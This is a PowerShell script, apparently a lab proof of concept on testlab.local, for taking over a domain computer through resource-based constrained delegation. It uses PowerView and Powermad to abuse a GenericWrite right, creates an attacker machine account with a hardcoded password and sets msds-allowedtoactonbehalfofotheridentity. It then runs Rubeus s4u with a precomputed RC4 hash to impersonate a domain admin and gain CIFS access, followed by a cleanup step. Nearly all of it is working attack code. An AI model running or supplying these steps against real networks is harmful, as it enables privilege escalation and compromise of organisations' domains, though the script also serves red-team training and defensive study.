# import the necessary toolsets
Import-Module .\powermad.ps1
Import-Module .\powerview.ps1

# we are TESTLAB\attacker, who has GenericWrite rights over the primary$ computer account
whoami

# the target computer object we're taking over
$TargetComputer = "primary.testlab.local"

$AttackerSID = Get-DomainUser attacker -Properties objectsid | Select -Expand objectsid

# verify the GenericWrite permissions on $TargetComputer
$ACE = Get-DomainObjectACL $TargetComputer | ?{$_.SecurityIdentifier -match $AttackerSID}
$ACE

ConvertFrom-SID $ACE.SecurityIdentifier

# add a new machine account that we control
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)

# get the SID of the new computer we've added
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid

# build the new raw security descriptor with this computer account as the principal
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

# get the binary bytes for the SDDL
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# confirming the security descriptor add
$RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl

# currently don't have access to primary\C$
dir \\primary.testlab.local\C$

# get the hashed forms of the plaintext
.\Rubeus.exe hash /password:Summer2018! /user:attackersystem /domain:testlab.local

# execute Rubeus' s4u process against $TargetComputer
#   EF266C6B963C0BB683941032008AD47F == 'Summer2018!'
#   impersonating "harmj0y" (a DA) to the cifs sname for the target computer (primary)
.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:harmj0y /msdsspn:cifs/primary.testlab.local /ptt


# cleanup - clear msds-allowedtoactonbehalfofotheridentity
Get-DomainComputer $TargetComputer | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'

